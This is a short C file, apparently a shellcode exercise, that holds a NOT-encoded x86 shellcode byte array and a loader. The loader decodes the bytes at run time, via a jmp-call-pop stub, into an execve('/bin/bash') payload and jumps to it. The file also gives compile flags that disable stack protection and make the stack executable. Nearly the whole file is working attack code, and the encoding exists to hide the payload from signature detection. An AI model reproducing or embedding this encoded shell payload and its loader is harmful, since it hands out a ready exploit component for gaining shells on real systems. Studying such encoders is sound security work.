// filename: shellcode-not-decoder.c
// author: lawly
// description: decodes not-encoded shellcode and executes it
//
// gcc -m32 -fno-stack-protector -z execstack -o shellcode-not-decoder shellcode-not-decoder.c   

#include <stdio.h>
#include <string.h>

unsigned char code[] = \
   "\xeb\x0c\x5e\x31\xc9\xb1\x1e\xf6\x16\x46\xe2\xfb\xeb\x05\xe8\xef\xff\xff\xff\xce\x3f\xaf\x97\x9d\x9e\x8c\x97\x97\x9d\x96\x91\xd0\x97\xd0\xd0\xd0\xd0\x76\x1c\xaf\x76\x1d\xac\x76\x1e\x4f\xf4\x32\x7f";

int main() {
    printf("shellcode length: %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}
